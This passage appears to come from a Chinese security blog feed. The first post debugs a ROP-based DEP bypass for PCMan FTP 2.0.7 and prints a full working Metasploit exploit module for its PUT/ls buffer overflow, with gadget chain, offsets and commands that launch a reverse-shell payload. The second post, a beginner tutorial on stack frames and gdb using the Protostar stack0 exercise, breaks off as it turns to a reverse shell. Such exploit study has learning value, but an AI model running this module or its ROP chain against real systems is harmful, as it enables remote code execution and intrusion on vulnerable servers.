-------------------end-----------------

再次跟踪到rop_gadges中的第一个地址，再f8直到上面sploit变量中的rop_gadget中的最后一个地址call esp的地址处程序报错，异常偏移为00a31b1b,难道是rop_gadgets中的地址串执行后没有实现后面的payload为栈中可执行?

再次跟踪到rop_gadgets中的所有地址，发现最后jmp esp执行后程序报错，报出0018edb8处为异常偏移，而0018edb8处为payload开始的对应的堆栈窗口中地址,且每次0018edb8中的数据都不同，难道连payload都被随机数填充了？

有比较大的可能性是执行完上面的rop_gadgets中的地址对应的指令后没有实现payload在栈中可执行，难道是不应该把mona生成的rop_gadges中的最后的pushad+retn对应的地址换成jmp esp的地址?

再看看相关mona的资料，后面的pushad + retn应该是存在的，具体原因见下图virtualprotect_rop中所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图virtualprotect_rop
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/virtualprotect_rop.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mona生成的rop_gadgets中的最后一句中的pushad+retn指令的地址是必须的，正是通过pushad+retn的执行才可以导致virtualprotect的执行，实现的原理是在pushad之前将pushad的各个寄存器按照对应的顺序设置成刚好可以调用virtualprotect函数使后面的shellcode为可执行
后来调试在进入virtualprotect_rop前最后一个函数00403e60的返回语句是retn 4而不是retn，所以rop_gadgets中的第一个地址后要加一个过渡的值，这里取为0x41414141

----------------------------00403e60--------------------------------
    00402A26    E8 35140000     call PCManFTP.00403E60
    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
    
        
        00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
        00403E65    81EC 14080000   sub esp,0x814
        00403E6B    85C0            test eax,eax
        ...
        ...
        ...
        00403FB1    5F              pop edi                                  ; kernel32.77032C3B
        00403FB2    5E              pop esi                                  ; kernel32.77032C3B
        00403FB3    81C4 14080000   add esp,0x814
        00403FB9    C2 0400         retn 0x4
-------------------------------end-----------------------------------

在mona生成的最后rop_chains.txt文件中有virutalalloc过dep的rop_gadgets,也有virtualprotect过dep的rop_gadgets,刚开始以为是mona出错了，后来发现是用到了mona里面的virtualalloc过dep方式
0day2中提到下面几种方法过dep:
1.ZwSetInformationProcess:利用api彻底关闭dep
2.VirtualProtect:利用api设置shellcode所在的内存空间为可执行
3.VirtualAlloc:利用api申请可执行内存后将shellcode复制过去（需再用memcopy的api）
4.利用可执行内存挑战dep
5.利用.NET挑战dep
6.利用Java applet挑战dep
这里用的是2中的virtualprotect中的方法，mona生成的virtualalloc的方法应该是缺少了memcopy的chain,导致刚开始一直错误地以为mona错了
最后再用mona生成的rop_gadgets如下：(第二个地址为新添加的0x41414141)
--------------------new_rop_gadgets--------------------
    rop_gadgets = 
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
      0x41414141,  # added data to fit retn 4 from func 00403e60
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
      0xffffddff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
      0x7647c663,  # &amp;amp;Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 
    ].flatten.pack(&quot;V*&quot;)
------------------------end----------------------------
再次开msf发payload，od附加,调试时发现如下图ebx_error错误
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/ebx_error.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来发现原来的mona中的virtualprotect是获得0x201(对应上面的0xffffddff,neg取反后为0x201)个可执行栈空间,以为是msf中的payload比这个长导致shellcode执行出错，后来将这个值设置为0xffffddff后没能关掉dep，应该是由于长度太大或许超过了栈空间的大小而导致virtualprotect函数的失败，于是没能成功关掉dep

后来将这个值设置成0xfffffaff(neg取反后的结果比0x201大),又可以关掉dep了,只是后面的shellcode执行还是不成功

怀疑有可能是像上图ebx_error中说的是ebx错了，也有可能是像0day2中说的ebp在溢出的过程中被破坏，这些只有再次从od中动态分析才可知

后来还是自己想多了，mona之所以称为神器，在于的确是神器，怎会轻易出错

换个payload马上成功,对msf还是不够熟悉！！一个payload不行可以换啊！！

最后的exploit.rb如下，改成mypcmanftp-anti-dep.rb,放到/msfdirectory/modules/exploit/windows/my/目录下后执行下面的命令:
use exploit/windows/my/mypcmanftp-anti-dep
set payload windows/shell/reverse_tcp_rc4
set RC4PASSWORD mypassword
exploit
成功弹shell
----------------------------exploit.rb-------------------------------
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require &#39;msf/core&#39;
    
    class Metasploit3 &amp;lt; Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          &#39;Name&#39;           =&amp;gt; &#39;PCMAN FTP Server Buffer Overflow - PUT Command&#39;,
          &#39;Description&#39;    =&amp;gt; %q{
              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          &#39;Author&#39;         =&amp;gt;
              [
                &#39;quanyechavshuo&#39;
              ],
          &#39;License&#39;        =&amp;gt; MSF_LICENSE,
          &#39;References&#39;     =&amp;gt;
            [
              [ &#39;EDB&#39;,   &#39;37731&#39;],
              [ &#39;OSVDB&#39;,   &#39;94624&#39;]
            ],
          &#39;DefaultOptions&#39; =&amp;gt;
            {
              &#39;EXITFUNC&#39; =&amp;gt; &#39;process&#39;
            },
          &#39;Payload&#39;        =&amp;gt;
            {
              &#39;Space&#39;   =&amp;gt; 1000,
              &#39;BadChars&#39;  =&amp;gt; &quot;\x00\x0A\x0D&quot;,
            },
          &#39;Platform&#39;       =&amp;gt; &#39;win&#39;,
          &#39;Targets&#39;        =&amp;gt;
            [
              [ &#39;windows 7 x64&#39;,
                {
                  &#39;Ret&#39; =&amp;gt; 0x77636aeb, # jmp esp C:\WINDOWS\system32\ntdll.dll
                  &#39;Offset&#39; =&amp;gt; 2008
                }
              ],
            ],
          &#39;DisclosureDate&#39; =&amp;gt; &#39;Aug 07 2015&#39;,
          &#39;DefaultTarget&#39;  =&amp;gt; 0))
      end
    
      def check
        connect_login
        disconnect
    
        if /220 PCMan&#39;s FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
      0x41414141,
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
      0xfffffaff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
      0x7647c663,  # &amp;amp;Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop 
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 

    ].flatten.pack(&quot;V*&quot;)

    return rop_gadgets

  end


      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        #sploit &amp;lt;&amp;lt; make_nops(9) 这句产生的nop并非90
        sploit &amp;lt;&amp;lt; &quot;\x90&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\x41&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
    
        #tmp=sploit
        tmp=make_nops(9)
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    
    end

-------------------------------end-----------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/succeed.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 13 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/13/pcman-ftp%E5%88%9D%E6%88%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/13/pcman-ftp%E5%88%9D%E6%88%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</guid>
        
        <category>ftp</category>
        
        <category>挖洞</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>二进制入门--动态跟踪源代码与反汇编代码</title>
        <description>&lt;h3 id=&quot;x01-&quot;&gt;0x01 栈基础知识&lt;/h3&gt;

&lt;h4 id=&quot;httpblogchinaunixnetuid-1848701-id-2825699html&quot;&gt;1&amp;gt;http://blog.chinaunix.net/uid-1848701-id-2825699.html&lt;/h4&gt;

&lt;h4 id=&quot;eip&quot;&gt;2&amp;gt;eip是当前帧中还没开始执行，下一步要执行的汇编指令的地址&lt;/h4&gt;

&lt;h4 id=&quot;section&quot;&gt;3&amp;gt;32位系统中，一个栈单元为32位&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esp+0x4代表下一个栈单元
esp+0x1c代表esp下面第[16+12=28(/4=7)] 7个栈单元
eg.
    esp[ss:0x00000000]         |ab221245|   --&amp;gt;  一个栈单元
    esp+0x4[ss:0x00000004]     |2348sko9|   --&amp;gt;  一个栈单元
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;call-addrpush-eip--jmp-addr&quot;&gt;4&amp;gt;call addr===&amp;gt;push eip + jmp addr&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;执行call addr时，由于call addr已经执行,所以call addr=push eip+jmp addr中的eip为call addr汇编指令当前所在帧中的下一条指令的地址,这里说的当前所在帧是如下图frame所示在当前图片看到的一片汇编指令代码,如执行0xff77b8d02处的call 0xf77bc2e0时,eip为当前帧的下一条指令的地址为f77b8d07
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图frame
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/eip.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;leavemov-espebp--pop-ebp&quot;&gt;5&amp;gt;leave===&amp;gt;mov esp,ebp + pop ebp&lt;/h4&gt;

&lt;h4 id=&quot;retnpop-eip--jmp-eip----eipespespesp4&quot;&gt;6&amp;gt;retn===&amp;gt;pop eip + jmp eip    (eip=[esp],esp=esp+4)&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;分析ret汇编语句时，最好不要把ret分开当作两句汇编指令，这样容易因为人脑习惯逐句解析两句，会和计算机的解析一句汇编指令错乱
特别是影响esp，eip的寄存器的分析时，要按照计算机的解析模式--&amp;gt;ret只是一句指令，执行完ret指令后，eip=[esp],esp=esp+4
分析ret指令时，先分析eip，再分析esp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;retn-0xnretn--espesp0xneipesp--espesp40xn&quot;&gt;7&amp;gt;retn 0xn===&amp;gt;retn &amp;amp;&amp;amp; esp=esp+0xn===&amp;gt;eip=[esp] &amp;amp;&amp;amp; esp=esp+4+0xn&lt;/h4&gt;

&lt;h4 id=&quot;call-esp&quot;&gt;8&amp;gt;call esp:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jmp esp
call esp
push esp+ret
这些汇编指令的地址放入存放函数返回地址的位置处都可以达到跳转到它后面的shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;由于call addr等同于push eip+jmp addr,执行call esp时，esp是个地址，系统将这里的esp翻译成一个普通地址，假设值为addr,call esp即相当于上面的call addr=push eip+jmp addr
      代码段：                                    栈段：          
                      ..                                                
                      ..                                  | addr1 |
        addr0     call esp(esp=addr)   ------&amp;gt;       addr |       |
        addr1     opcode_1                                |       |

当eip=addr0时，esp=addr
当eip=addr1时，正在执行addr0处的call esp,也即call addr=push eip+jmp addr=push addr1+jmp addr
执行完call esp后栈段如上图右部所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;pop-pop-retjmp-esp16pop-pop-ret&quot;&gt;9&amp;gt;pop pop ret=jmp &lt;a href=&quot;条件：pop pop ret的地址在栈中且马上要执行&quot;&gt;esp+16&lt;/a&gt;&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;栈段：                          代码段：

    addr0     | addr1 |                 addr1:  pop1
    addr0+4   |       |                         pop2
    addr0+8   |       |                         ret
    addr0+12  |       |
    addr0+16  |       |

满足条件时,栈中addr1覆盖的是一个函数的返回地址,esp=eip=addr0，还没但正要去执行ret=pop eip+jmp eip,
执行完这个ret的前一句后,eip=ret的地址,esp=addr0,然后跳转到ret的地址处执行ret
执行完这个ret后，eip=addr1,esp=addr0+4,然后执行addr1处的pop1
执行完pop1后，eip=addr1+4,esp=addr0+8,然后执行addr1+4处的pop2
执行完pop2后，eip=addr1+8,esp=addr0+12,然后执行addr1+8处的ret
执行完ret后，eip=[addr0+16],esp=addr0+16,然后执行[add0+16]处的代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-gdb&quot;&gt;0x02 gdb动态调度&lt;/h3&gt;

&lt;h4 id=&quot;gdb&quot;&gt;1&amp;gt;gdb常用调试命令&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://wenku.baidu.com/link?url=W1u-DTrFwMreJsYavwKcI_yDzJsJglUJ4yfcXXXxWOkGTlJSSqXm-4zohcUYxGciOIeFRcSY0gr2qn-K5pnqGRU6nGbgQvW6XVfaRMCdmKq
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section-1&quot;&gt;2&amp;gt;提炼命令:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   --------terminal-----------
   gdb
   help
   help data
   help stack
   help status
   -----------end-------------
   gdb stack0           #===&amp;gt;gdb + file stack0
   l(list)              #show source
   b 7(break 7)         #add break on line7
   b 8(break 8)         #add break on line8
   b 11
   b 13
   b 15
   info b(info break)
   info registers       #show registers
   r(run)
   disas /m
                /r      #show hex(显示汇编指令对应十六进制值)
                /m      #show source if available(如果有源码，显示对应行源码)
   set disassembly-flavor att/intel     #设置att或intel格式
   set disassemble-next-line            #设置下一步是否显示汇编码
   si(setpi)                            #==&amp;gt; step into,like f7 in od
   ni(nexti)                            #==&amp;gt; like f8 in od
   leave                #立即中断当前函数运行并返回，当前函数的剩余语句将不被执行
   finish               #执行到当前函数返回之后停止，当前函数的剩余语句将正常运行
   bt(backtrace)        #查看所有栈帧信息
   f num(frame num)     #选择并打印第num个栈帧信息
   info f(info frame)   #查看当前栈帧信息
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 实例分析&lt;/h3&gt;

&lt;h4 id=&quot;linkhttpsexploit-exercisescomprotostarstack0&quot;&gt;link:https://exploit-exercises.com/protostar/stack0/&lt;/h4&gt;

&lt;p&gt;源码如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--------stack0.c----------
1       #include &amp;lt;stdlib.h&amp;gt;
2       #include &amp;lt;unistd.h&amp;gt;
3       #include &amp;lt;stdio.h&amp;gt;
4
5       int main(int argc, char **argv)
6       {
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
11        gets(buffer);
12
13        if(modified != 0) {
14            printf(&quot;you have changed the &#39;modified&#39; variable\n&quot;);
15        } else {
16            printf(&quot;Try again?\n&quot;);
17        }
18      }
-----------end------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,在终端中执行如下命令，下面为实时操作与对输出的相应理解&lt;/p&gt;

&lt;p&gt;on kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/桌面
vi stack0.c with upon source code
gcc -g -o stack0 stack0.c
gdb stack0

l
----------output:----------
1       #include &amp;lt;stdlib.h&amp;gt;
2       #include &amp;lt;unistd.h&amp;gt;
3       #include &amp;lt;stdio.h&amp;gt;
4
5       int main(int argc, char **argv)
6       {
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;kjkkkk
-----------end----------

l
----------output:----------
11        gets(buffer);                                                                                                                      
12                                                                                                                                           
13        if(modified != 0) {                                                                                                                
14            printf(&quot;you have changed the &#39;modified&#39; variable\n&quot;);                                                                          
15        } else {                                                                                                                           
16            printf(&quot;Try again?\n&quot;);                                                                                                        
17        }                                                                                                                                  
18      } 
-----------end----------

b 7
b 8
b 11
b 13
b 15

info b
---------output:-----------
Num     Type           Disp Enb Address    What                                                                                              
1       breakpoint     keep y   0x080483fd in main at stack0.c:7                                                                             
breakpoint already hit 1 time                                                                                                        
2       breakpoint     keep y   0x080483fd in main at stack0.c:8                                                                             
breakpoint already hit 1 time                                                                                                        
3       breakpoint     keep y   0x08048405 in main at stack0.c:11                                                                            
breakpoint already hit 1 time                                                                                                        
4       breakpoint     keep y   0x08048411 in main at stack0.c:13                                                                            
5       breakpoint     keep y   0x08048427 in main at stack0.c:15     
----------end--------------

r

disas /m
-------------output:---------------
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     movl   $0x0,0x5c(%esp)
---------------end-----------------

通过上面的结果发现中断在line10,而其中line7,lin8中的两个定义变量的语句volatile int modified和char buffer[64]并没有中断效果 

main函数对应汇编代码从line6开始:
---------------------------------汇编跟踪:line6------------------------------------------
Dump of assembler code for function main:
6       {
0x080483f4 &amp;lt;+0&amp;gt;:     push   %ebp                 #ebp压栈，对应下图stack0中的序号1
0x080483f5 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp            #ebp=esp,对应下图stack0中的序号2
0x080483f7 &amp;lt;+3&amp;gt;:     and    $0xfffffff0,%esp     #将esp最后四位置0,应该是一种安全措施，获得更大的栈空间,对应序号3
0x080483fa &amp;lt;+6&amp;gt;:     sub    $0x60,%esp           #扩大栈空间,0x60=96=(/4=24)24个栈单元,对应序号4
---------------------------------------end-----------------------------------------------

line7,lin8代码：
------------line7,8---------------
7         volatile int modified;
8         char buffer[64];
--------------end-----------------

这两行代码由于无法在gdb中跟踪，暂时无法确定在栈中的分布情况

--------------secret-----------------
下文将会得出(此时可以先不看这个secret)：
1.进入main函数前的上一帧中，有一个调用main函数的动作，为了调用main函数，有这几个动作：
1&amp;gt;将main函数的参数从右到左压栈(push)
2&amp;gt;call main,将当前帧（还没进入main函数时的帧)中call main汇编语句的下一行汇编语句的地址压栈
2.在进入main函数，main初始化后(push ebp,ebp=esp,esp=esp-0x60),声明变量的line7:volatile int modified,char buffer[64]的对应汇编效果是：
从上一句esp=esp-0x60中的esp为扩展0x60的栈空间大小之前的esp开始依次“压入”接下来声明的各个变量,也即：
1&amp;gt;在下图stack0中的0xffffd4ec中“压入” modified变量,在0xffffd4ec上面“压入”buffer[64]这个大变量,也即在0xffffd4ec-0x40&amp;lt;==&amp;gt;0xffffd4ec上面64B空间(16个栈单元)的位置上
2&amp;gt;这里打了引号的“压入”没有esp=esp-4的效果，应该是操作系统对程序初始化时算好了将要声明的变量放到（“压入”）对应的位置上
3.一般栈中从下到上数据依次为函数从右到左的参数、调用该函数的上一帧中&quot;call 该函数&quot;形式的对应汇编指令的下一句汇编指令的地址
4.只要修改了0xffffd4ec处（存放了modified变量）的值,将其改成非0就可以完成这一题的要求了
5.上面3中说的非0是内存中的非0，如果是键盘上的0键并不是内存中的0,如下图ascii所示
--------------end--------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图ascii
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/ascii.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;line10:(line9是空格行)
-----------------汇编跟踪:line10----------------------
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     movl   $0x0,0x5c(%esp)      #0x5c=92(/4=23)=23个栈单元,将esp下面第23个栈单元置0,对应图中序号5,在下一步可可发现是将0xffffd4ec处的32位空间置0
----------------------end-----------------------------

x $esp+0x5c
----------output:------------
0xffffd4ec:     0xf7fa6000
------------end--------------

再执行stepi后会执行[esp+0x5c]=0,将上面的地址对应内容置0

line11:
-----------------汇编跟踪:line11-----------------------
11        gets(buffer);
0x08048405 &amp;lt;+17&amp;gt;:    lea    0x1c(%esp),%eax          #eax=esp+0x1c,0x1c=28(/4=7)=7个栈单元,对应图中序号6
0x08048409 &amp;lt;+21&amp;gt;:    mov    %eax,(%esp)              #[esp]=eax,对应图中序号7,为了下面的call gets作准备--&amp;gt;将func gets的参数“入栈”(放到对应的位置，不是push arg,没有esp=esp-4)
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;     #上面一行[esp]=eax=addr,将buffer[64]的起始地址放入栈中准备给gets函数调用
-----------------------end-----------------------------

stepi(0xffffd4ec被置0)
x $esp+0x5c
-----------output:-----------
0xffffd4ec:     0x00000000
-------------end-------------

disas /m
------------out:-----------
11        gets(buffer);                                                                                                                      
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    0x1c(%esp),%eax     #这行左边的箭头表示运行到这行，也即eip=0x08048405,此时x $esp+0x5c ===&amp;gt; 0xffffd4ec:  0x00000000
    
0x08048409 &amp;lt;+21&amp;gt;:    mov    %eax,(%esp)         #此外，lea 0x1c(%esp),%eax(in att mode)&amp;lt;==&amp;gt;lea eax,[esp+0x1c](in intel mode)                                                                                                                                                            
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;                                                                                          
-------------end-----------

set disassembly-flavor intel(upon output is the result of &quot;set dissassembly-flavor att&quot; on default)
---------------output:---------------
11        gets(buffer);                                                                                                                      
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]                                                                                                
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax                                                                                           
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;                                                                                          
------------------end----------------

pay attention to eip part:(symbol &quot;=&amp;gt;&quot; means eip is here)
---------eip part----------
11        gets(buffer);                                                                    
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]           #将esp+0x1c的值赋给eax,eax=0xffffd4ac
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax      
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;     #push 0x08048411,jmp func gets,对应图中序号8
------------end------------

p $esp+0x1c          #print $esp+0x1c,打印$esp+0x1c变量的值
output:$2 = (void *) 0xffffd4ac

x $esp+0x1c          #x addr==&amp;gt;print [addr],that is to say,print the value in the address of addr
---------output:(==&amp;gt;x $eax)----
0xffffd4ac:     0xf7e2e243
-----------end-----------------

si
si
disas /m
---------output:------------
11        gets(buffer);
0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax
=&amp;gt; 0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;
----------end---------------

x $eax
-------output:------------
0xffffd4ac:     0xf7e2e243
------------end-----------
    
x/4 $esp    #查看当前栈中esp起4个栈单元的情况
---------output:------------
0xffffd490:     0xffffd4ac      0x00000000      0x000000c2      0xf7e92ee6
-------------end------------

其中的0xffffd4ac对应图中的序号6中数值
    
n
输入：
12345678981234567898123456789812345678981234567898123456789812340000
enter
其中最后的12340000为第60到68个字符
-----------output:--------------
Breakpoint 4, main (argc=1, argv=0xffffd594) at stack0.c:13
13        if(modified != 0) {
--------------end---------------
    
si
disas /m
---------output:------------
13        if(modified != 0) {
0x08048411 &amp;lt;+29&amp;gt;:    mov    eax,DWORD PTR [esp+0x5c]
=&amp;gt; 0x08048415 &amp;lt;+33&amp;gt;:    test   eax,eax
-------------end------------

p $eax
-----------output:------------
$4 = 808464432
------------end---------------

p/x $eax(以十六进制显示eax的值,help x(x $esp+0x1c相当于p [$esp+0x1c]的效果，只不过p不支持p [somethin]命令显示内存地址对应的内容)中的/FMT可以看到支持的各种显示格式)
------------output:-------------
$5 = 0x30303030
---------------end--------------

这里的0x30303030是上面输入的68个键盘上的数字中的最后4个0对应的内存中的值，键盘上的数字0对应的真实内存ascii值为48（十进制）,也即十六进制0x30,更多关于ascii的理解可参考https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9217
所以要输入第65到68个字符单元为内存中的0,也即ascii值为nul的字符：
print &#39;\x00&#39;(或python -c &#39;print &quot;\x00&quot;&#39;)
output:空
print &#39;0&#39;(或python -c &#39;python &quot;0&quot;&#39;)
output:0
print &#39;\x30&#39;(或python -c &#39;python &quot;\x30&quot;&#39;)
output:0
所以print &#39;\x00&#39;在内存中的数据为0,print &#39;0&#39;&amp;lt;==&amp;gt;print &#39;\x30&#39;
重新运行./stack0并输入下面的值可使modified在内存中的值不变，依然为内存中的0
1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00
注意，如果直接在键盘上输入上面这一长串，最后的\x00\x00\x00\x00在内存中并不能被解析成内存中的0000,要使用如下方法:

print &#39;1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00&#39; | ./stack0
或
echo &#39;1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00&#39; | ./stack0

原题中要求改变modified位，直接输入键盘上的任意大于64位的一串字符即可，因为键盘上的数字0在内存中是0x30,如果将键盘上的0键输入到对应的modified位上，会改变modified
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图stack0
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/stack0.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值，这里进行扩展，通过栈溢出反弹shell.
该题中ASLR(地址随机化) 和 NX(栈不可执行)已禁用
由上图stack0及分析易知：
